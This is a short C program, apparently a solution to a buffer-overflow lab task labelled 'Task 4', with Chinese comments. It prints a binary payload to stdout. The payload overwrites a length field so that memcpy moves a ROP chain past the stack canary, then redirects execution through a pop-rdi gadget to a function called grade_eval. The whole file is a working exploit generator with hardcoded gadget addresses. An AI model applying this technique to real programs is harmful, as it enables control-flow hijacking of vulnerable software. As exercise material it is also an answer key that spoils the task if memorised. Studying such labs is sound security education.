/* Task 4: 改写 len=0xA0,借 memcpy 把 ROP 链搬到 canary 上方 */
#include <stdio.h>

static void w8(unsigned long long v){ for(int i=0;i<8;i++) fputc((v>>(8*i))&0xff,stdout); }
static void w4(unsigned int v){ for(int i=0;i<4;i++) fputc((v>>(8*i))&0xff,stdout); }

int main(void){
    w8(0ULL);            /* 搬运后落至 saved rbp,值无所谓 */
    w8(0x4018A3ULL);     /* 落至返回地址: pop %rdi; ret */
    w8(4ULL);
    w8(0x4018B1ULL);     /* ret 垫片,栈对齐 */
    w8(0x401677ULL);     /* grade_eval */
    for(int i=0;i<88;i++) fputc('B',stdout);      /* expression 填充至 128 */
    for(int i=0;i<128;i++) fputc('C',stdout);     /* logMsg */
    w4(0xA0U);                                    /* len */
    return 0;
}
